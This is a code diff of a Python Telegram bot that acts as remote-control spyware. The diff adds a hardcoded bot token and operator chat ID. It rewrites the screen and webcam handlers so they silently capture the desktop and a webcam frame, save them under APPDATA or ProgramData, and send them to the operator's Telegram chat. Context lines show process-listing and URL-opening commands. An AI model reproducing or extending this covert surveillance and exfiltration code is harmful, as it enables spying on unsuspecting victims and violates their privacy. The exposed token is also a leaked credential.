@@ -7,17 +7,18 @@ import json
 import cv2
 import requests as r
 import subprocess
-import telepot, requests  
+#import telepot 
 from json import loads
 from PIL import ImageGrab
 from telebot import util
 from telebot import types
 from subprocess import Popen, PIPE
-from telepot.namedtuple import InlineKeyboardMarkup, InlineKeyboardButton
+#from telepot.namedtuple import InlineKeyboardMarkup, InlineKeyboardButton
 
 
-token = ''
-id_chat = ''
+token = '6172744012:AAHCFxQr9jX-lC3JT1GcyvmnnbFBHRF-WXI'
+# id_chat = '431907870'
+id_chat = '787995675'
 bot = telebot.TeleBot(token, threaded=True)
 
 @bot.message_handler(commands=['start'])
@@ -74,34 +75,34 @@ def tasklist(command):
 @bot.message_handler(commands=['screen'])
 def send_screen(command):
 	try:
-		screenshot = ImageGrab.grab()
-		screenshot.save('screenshot.jpg')
-		bot.sendChatAction(chat_id, 'upload_photo')
-		bot.sendDocument(chat_id, open('screenshot.jpg', 'rb'))
-		os.remove('screenshot.jpg')
+		screen = ImageGrab.grab()
+		screen.save(os.getenv("APPDATA") + '\\Sreenshot.jpg')
+		screen = open(os.getenv("APPDATA") + '\\Sreenshot.jpg', 'rb')
+		files = {'photo': screen}
+		bot.send_photo(id_chat, screen)
 	except:
-		bot.send_message(id_chat, 'Error')
-
-@bot.message_handler(commands=['cam'])
-def cam(command):
+		bot.send_photo(id_chat, 'Error')
+		
+@bot.message_handler(commands=['webcam', 'Webcam'])
+def webcam(command):
 	try:
-		camera = cv2.VideoCapture(0)
-		while True:
-			return_value,image = camera.read()
-			gray = cv2.cvtColor(image,cv2.COLOR_BGR2GRAY)
-			cv2.imshow('image',gray)
-			if cv2.waitKey(1)& 0xFF == ord('s'):
-				cv2.imwrite('webcam.jpg',image)
-				break
-		camera.release()
-		cv2.destroyAllWindows()
-		bot.sendChatAction(chat_id, 'upload_photo')
-		bot.sendDocument(chat_id, open('webcam.jpg', 'rb'))
-		os.remove('webcam.jpg')
+		cap = cv2.VideoCapture(0)
+		for i in range(30):
+			cap.read()
+
+		ret, frame = cap.read()
+		cv2.imwrite(os.environ['ProgramData'] + '\\WebCam.jpg', frame)
+
+		bot.send_chat_action(id_chat, 'upload_photo')
+		cap.release()
+
+		webcam = open(os.environ['ProgramData'] + '\\WebCam.jpg', 'rb')
+		bot.send_photo(id_chat, webcam)
+		webcam.close()
 	except:
 		bot.send_chat_action(id_chat, 'typing')
 		bot.send_message(id_chat, '*Webcam not found*', parse_mode="Markdown")
-		
+
 @bot.message_handler(commands=['url'])
 def opnurl(message):
 	user_msg = '{0}'.format(message.text)
@@ -111,7 +112,4 @@ def opnurl(message):
 	except:
 		bot.send_message(id_chat, 'Error')
 
-bot.infinity_polling()
-
-		
 bot.infinity_polling()
